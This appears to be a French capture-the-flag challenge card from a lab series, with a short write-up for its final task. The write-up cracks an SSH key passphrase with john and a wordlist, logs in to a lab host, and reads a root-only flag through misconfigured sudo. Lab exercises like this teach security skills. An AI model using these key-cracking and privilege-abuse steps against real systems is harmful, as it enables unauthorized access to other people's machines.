# 30 - The Final Flag

## Nom du Challenge
The Final Flag

## Description
Dernière étape d'une opération de cyber-espionnage: combiner une clé crackée et un accès SSH latent pour extraire le flag maître.

## Difficulté
Expert

## Points
500 pts

## Format du Flag
IPNET{mot_de_passe_ou_cle}

## Hints
1. Réutilise les artefacts des challenges précédents.
2. Charge la clé crackée puis connecte-toi au serveur final.
3. Le flag est dans un fichier root-only exfiltré via sudo mal configuré.

## Solution (Write-up)
```bash
ssh2john final_id_rsa > final.hash
john --wordlist=/usr/share/wordlists/rockyou.txt final.hash
ssh -i final_id_rsa operator@10.10.10.30
sudo cat /opt/final/flag.txt
# IPNET{mot_de_passe_ou_cle}
```
